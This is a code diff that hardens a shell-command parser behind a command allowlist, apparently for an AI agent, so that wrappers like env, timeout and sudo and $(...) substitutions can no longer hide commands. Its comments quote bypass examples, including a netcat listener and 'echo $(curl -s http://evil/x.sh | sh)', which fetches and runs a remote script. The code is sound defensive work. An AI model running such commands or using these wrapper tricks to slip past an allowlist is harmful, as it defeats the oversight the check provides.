@@ -42,7 +42,13 @@ def _cross_platform_basename(path: str) -> str:
 
     # For POSIX paths or simple command names, use PurePosixPath
     # (os.path.basename works but PurePosixPath is more explicit)
-    return PurePosixPath(path).name
+    name = PurePosixPath(path).name
+
+    # `.` and `..` have no basename, and `.` is a command: the other spelling
+    # of `source`. Returning "" for it put an empty name in front of the
+    # allowlist, which refused it with a message naming nothing — and hid it
+    # from the `.` validator, which is the one with something to say.
+    return name or path
 
 
 def _fallback_extract_commands(command_string: str) -> list[str]:
@@ -61,24 +67,6 @@ def _fallback_extract_commands(command_string: str) -> list[str]:
     """
     commands = []
 
-    # Shell keywords to skip
-    shell_keywords = {
-        "if",
-        "then",
-        "else",
-        "elif",
-        "fi",
-        "for",
-        "while",
-        "until",
-        "do",
-        "done",
-        "case",
-        "esac",
-        "in",
-        "function",
-    }
-
     # First, split by common shell operators
     # This regex splits on &&, ||, |, ; while being careful about quotes
     # We're being permissive here since shlex already failed
@@ -89,50 +77,33 @@ def _fallback_extract_commands(command_string: str) -> list[str]:
         if not part:
             continue
 
-        # Skip variable assignments at the start (VAR=value cmd)
-        while re.match(r"^[A-Za-z_][A-Za-z0-9_]*=\S*\s+", part):
-            part = re.sub(r"^[A-Za-z_][A-Za-z0-9_]*=\S*\s+", "", part)
-
-        if not part:
+        # Tokenize the WHOLE part, not just its head. A wrapper puts the
+        # command that matters after its own arguments, and a fallback that
+        # stopped at the first token would be the bypass `_scan_tokens` exists
+        # to close — reachable on Windows, where this parser is the one that
+        # runs.
+        tokens = [
+            match.group(1) or match.group(2) or match.group(3)
+            for match in re.finditer(r'"([^"]*)"|\'([^\']*)\'|(\S+)', part)
+        ]
+        if not tokens:
             continue
 
-        # Strategy: Extract command from the BEGINNING of the part
-        # Handle various formats:
-        # - Simple: python3, npm, git
-        # - Unix path: /usr/bin/python
-        # - Windows path: C:\Python312\python.exe
-        # - Quoted with spaces: "C:\Program Files\python.exe"
+        for cmd in _scan_tokens(tokens):
+            # Remove Windows extensions
+            cmd = re.sub(r"\.(exe|cmd|bat|ps1|sh)$", "", cmd, flags=re.IGNORECASE)
 
-        # Extract first token, handling quoted strings with spaces
-        first_token_match = re.match(r'^(?:"([^"]+)"|\'([^\']+)\'|([^\s]+))', part)
-        if not first_token_match:
-            continue
+            # Clean up any remaining quotes or special chars at the start
+            cmd = re.sub(r'^["\'\\/]+', "", cmd)
 
-        # Pick whichever capture group matched (double-quoted, single-quoted, or unquoted)
-        first_token = (
-            first_token_match.group(1)
-            or first_token_match.group(2)
-            or first_token_match.group(3)
-        )
+            # Skip tokens that look like function calls or code fragments (not
+            # shell commands). These appear when splitting on semicolons inside
+            # malformed quoted strings.
+            if "(" in cmd or ")" in cmd or "." in cmd:
+                continue
 
-        # Now extract just the command name from this token
-        # Handle Windows paths (C:\dir\cmd.exe) and Unix paths (/dir/cmd)
-        # Use cross-platform basename for reliable path handling on any OS
-        cmd = _cross_platform_basename(first_token)
-
-        # Remove Windows extensions
-        cmd = re.sub(r"\.(exe|cmd|bat|ps1|sh)$", "", cmd, flags=re.IGNORECASE)
-
-        # Clean up any remaining quotes or special chars at the start
-        cmd = re.sub(r'^["\'\\/]+', "", cmd)
-
-        # Skip tokens that look like function calls or code fragments (not shell commands)
-        # These appear when splitting on semicolons inside malformed quoted strings
-        if "(" in cmd or ")" in cmd or "." in cmd:
-            continue
-
-        if cmd and cmd.lower() not in shell_keywords:
-            commands.append(cmd)
+            if cmd:
+                commands.append(cmd)
 
     return commands
 
@@ -149,7 +120,7 @@ def split_command_segments(command_string: str) -> list[str]:
     # Further split on semicolons
     result = []
     for segment in segments:
-        sub_segments = re.split(r'(?<!["\'])\s*;\s*(?!["\'])', segment)
+        sub_segments = re.split(r'(?<!["\'\\])\s*;\s*(?!["\'])', segment)
         for sub in sub_segments:
             sub = sub.strip()
             if sub:
@@ -221,6 +192,270 @@ def unwrap_rtk_prefixes(command_string: str) -> str:
     return "".join(rebuilt)
 
 
+#: Commands that run another command given as their own argument.
+#:
+#: `extract_commands` used to record the first token of a segment and stop:
+#: `expect_command` went False and only an operator (`|`, `&&`, `;`) turned it
+#: back on. So `env FOO=1 nc -l 4444` reached the allowlist as `env`, and
+#: `timeout 5 nc -l 4444` as `timeout` — one allowlisted word standing in front
+#: of every binary on the machine, which is the exact failure
+#: `unwrap_rtk_prefixes` was written to prevent for `rtk`. The class is simply
+#: wider than rtk.
+#:
+#: The value is the set of options that consume the **following** token, so the
+#: scan knows `-u PATH` is two tokens of `env` and not a command called `PATH`.
+#: Getting that set wrong costs a false block, never a false pass: an
+#: unrecognised option leaves the scan pointing at the option's value, which is
+#: not an allowlisted command name.
+TRANSPARENT_WRAPPERS: dict[str, frozenset[str]] = {
+    "env": frozenset({"-u", "--unset", "-C", "--chdir", "-S", "--split-string"}),
+    "nohup": frozenset(),
+    "setsid": frozenset({"-w"}),
+    "nice": frozenset({"-n", "--adjustment"}),
+    "ionice": frozenset({"-c", "--class", "-n", "--classdata", "-p", "--pid"}),
+    "stdbuf": frozenset({"-i", "--input", "-o", "--output", "-e", "--error"}),
+    "timeout": frozenset({"-s", "--signal", "-k", "--kill-after"}),
+    "watch": frozenset({"-n", "--interval", "-d", "--differences"}),
+    "time": frozenset({"-f", "--format", "-o", "--output"}),
+    "command": frozenset(),
+    "builtin": frozenset(),
+    "exec": frozenset({"-a"}),
+    "xargs": frozenset(
+        {
+            "-I",
+            "-i",
+            "-n",
+            "-P",
+            "-L",
+            "-d",
+            "-E",
+            "-s",
+            "-a",
+            "--replace",
+            "--max-args",
+            "--max-procs",
+            "--max-lines",
+            "--delimiter",
+            "--arg-file",
+            "--eof",
+            "--max-chars",
+        }
+    ),
+    "sudo": frozenset({"-u", "--user", "-g", "--group", "-p", "--prompt", "-C", "-U"}),
+    "doas": frozenset({"-u", "-C"}),
+}
+
+#: Tokens a wrapper takes positionally *before* the command it runs.
+#: `timeout 5 cmd` is the only common one; naming it beats a "looks numeric"
+#: heuristic, which would also swallow a first argument that mattered.
+_WRAPPER_POSITIONALS: dict[str, int] = {"timeout": 1}
+
+#: The shell constructs that open a command line inside another one.
+#: `shell_validators` has refused these inside `bash -c` since it was written;
+#: at the top level nothing looked for them at all, so
+#: `echo $(curl -s http://evil/x.sh | sh)` reached the allowlist as `echo`.
+_SUBSTITUTION_OPENERS: tuple[tuple[str, str], ...] = (
+    ("$(", ")"),
+    ("<(", ")"),
+    (">(", ")"),
+)
+
+
+def extract_substitutions(command_string: str) -> list[str]:
+    """Return the command lines hidden inside `$(...)`, backticks and `<(...)`.
+
+    Nesting is followed one layer at a time: the inner text of `$(echo $(id))`
+    comes back whole, and a caller validating it recursively meets `$(id)` on
+    the next round.
+
+    Quoting is not honoured, on purpose. `"$(id)"` substitutes exactly like
+    `$(id)`, so a scan that skipped quoted regions would miss the common case.
+    A single-quoted `'$(id)'` does not substitute, so reporting it is a false
+    block — that is the direction worth erring in, and an agent that means the
+    literal has `printf` and the `\\$` escape.
+
+    `$((...))` is arithmetic expansion. Nothing runs in it, and it is skipped.
+    """
+    found: list[str] = []
+    index = 0
+    length = len(command_string)
+
+    while index < length:
+        char = command_string[index]
+
+        if char == "\\":
+            index += 2
+            continue
+
+        if char == "`":
+            end = index + 1
+            while end < length:
+                if command_string[end] == "\\":
+                    end += 2
+                    continue
+                if command_string[end] == "`":
+                    break
+                end += 1
+            if end < length:
+                inner = command_string[index + 1 : end]
+                if inner.strip():
+                    found.append(inner)
+                index = end + 1
+                continue
+            index += 1
+            continue
+
+        opener = next(
+            (
+                pair[0]
+                for pair in _SUBSTITUTION_OPENERS
+                if command_string.startswith(pair[0], index)
+            ),
+            None,
+        )
+        if opener is None:
+            index += 1
+            continue
+
+        if command_string.startswith("$((", index):
+            index += 3
+            continue
+
+        depth = 1
+        cursor = index + len(opener)
+        while cursor < length and depth:
+            if command_string[cursor] == "\\":
+                cursor += 2
+                continue
+            if command_string[cursor] == "(":
+                depth += 1
+            elif command_string[cursor] == ")":
+                depth -= 1
+            cursor += 1
+
+        closed = depth == 0
+        inner = command_string[index + len(opener) : (cursor - 1) if closed else length]
+        if inner.strip():
+            found.append(inner)
+        index = cursor if closed else length
+
+    return found
+
+
+_SHELL_KEYWORDS: frozenset[str] = frozenset(
+    {
+        "if",
+        "then",
+        "else",
+        "elif",
+        "fi",
+        "for",
+        "while",
+        "until",
+        "do",
+        "done",
+        "case",
+        "esac",
+        "in",
+        "!",
+        "{",
+        "}",
+        "(",
+        ")",
+        "function",
+    }
+)
+
+#: Redirections that are followed by their target. `2>&1` names its target in
+#: the same token and so is not here — skipping the token after it would eat a
+#: command.
+_REDIRECTS_WITH_TARGET: frozenset[str] = frozenset(
+    {"<<", "<<<", ">>", ">", "<", "2>", "2>>", "&>", "&>>"}
+)
+
+
+def _scan_tokens(tokens: list[str]) -> list[str]:
+    """Record every token in `tokens` that a shell would run as a command.
+
+    One token per pipeline stage used to be the whole of it. This walks the
+    stage as well, because a transparent wrapper (`env`, `timeout`, `sudo`,
+    `xargs`…) puts the command that matters *after* its own arguments — see
+    `TRANSPARENT_WRAPPERS`.
+
+    The wrapper itself is still recorded. It has to be: the allowlist decides
+    whether `sudo` may be run at all, and that question is not answered by
+    what follows it.
+    """
+    commands: list[str] = []
+    expect_command = True
+    # Set while the scan is walking a wrapper's own arguments.
+    wrapper_options: frozenset[str] = frozenset()
+    positionals_left = 0
+    skip_next = False
+
+    for token in tokens:
+        if skip_next:
+            skip_next = False
+            continue
+
+        # Shell operators indicate a new command follows
+        if token in ("|", "||", "&&", "&"):
+            expect_command = True
+            wrapper_options = frozenset()
+            positionals_left = 0
+            continue
+
+        if token in _SHELL_KEYWORDS:
+            continue
+
+        # A wrapper option that consumes the next token — checked before the
+        # generic flag skip below, which is what tells `env -u PATH nc` from a
+        # command named `PATH`.
+        if expect_command and token in wrapper_options:
+            skip_next = True
+            continue
+
+        # Skip flags/options
+        if token.startswith("-"):
+            continue
+
+        # Skip variable assignments (VAR=value)
+        if "=" in token and not token.startswith("="):
+            continue
+
+        if token in _REDIRECTS_WITH_TARGET:
+            # The target is a path, never a command. Skipping it matters only
+            # while a command is still expected (`exec > log`), but skipping it
+            # always keeps the two cases from having to be told apart.
+            skip_next = True
+            continue
+
+        if token == "2>&1":
+            continue
+
+        if not expect_command:
+            continue
+
+        if positionals_left:
+            positionals_left -= 1
+            continue
+
+        # Extract the base command name (handle paths like /usr/bin/python)
+        # Use cross-platform basename for Windows paths on Linux CI
+        cmd = _cross_platform_basename(token)
+        commands.append(cmd)
+
+        wrapper_options = TRANSPARENT_WRAPPERS.get(cmd, frozenset())
+        if cmd in TRANSPARENT_WRAPPERS:
+            # Keep expecting: the command this one runs is still ahead.
+            positionals_left = _WRAPPER_POSITIONALS.get(cmd, 0)
+        else:
+            expect_command = False
+            positionals_left = 0
+
+    return commands
+
+
 def extract_commands(command_string: str) -> list[str]:
     """
     Extract command names from a shell command string.
@@ -247,7 +482,7 @@ def extract_commands(command_string: str) -> list[str]:
     commands = []
 
     # Split on semicolons that aren't inside quotes
-    segments = re.split(r'(?<!["\'])\s*;\s*(?!["\'])', command_string)
+    segments = re.split(r'(?<!["\'\\])\s*;\s*(?!["\'])', command_string)
 
     for segment in segments:
         segment = segment.strip()
@@ -269,57 +504,7 @@ def extract_commands(command_string: str) -> list[str]:
         if not tokens:
             continue
 
-        # Track when we expect a command vs arguments
-        expect_command = True
-
-        for token in tokens:
-            # Shell operators indicate a new command follows
-            if token in ("|", "||", "&&", "&"):
-                expect_command = True
-                continue
-
-            # Skip shell keywords that precede commands
-            if token in (
-                "if",
-                "then",
-                "else",
-                "elif",
-                "fi",
-                "for",
-                "while",
-                "until",
-                "do",
-                "done",
-                "case",
-                "esac",
-                "in",
-                "!",
-                "{",
-                "}",
-                "(",
-                ")",
-                "function",
-            ):
-                continue
-
-            # Skip flags/options
-            if token.startswith("-"):
-                continue
-
-            # Skip variable assignments (VAR=value)
-            if "=" in token and not token.startswith("="):
-                continue
-
-            # Skip here-doc markers
-            if token in ("<<", "<<<", ">>", ">", "<", "2>", "2>&1", "&>"):
-                continue
-
-            if expect_command:
-                # Extract the base command name (handle paths like /usr/bin/python)
-                # Use cross-platform basename for Windows paths on Linux CI
-                cmd = _cross_platform_basename(token)
-                commands.append(cmd)
-                expect_command = False
+        commands.extend(_scan_tokens(tokens))
 
     return commands
 
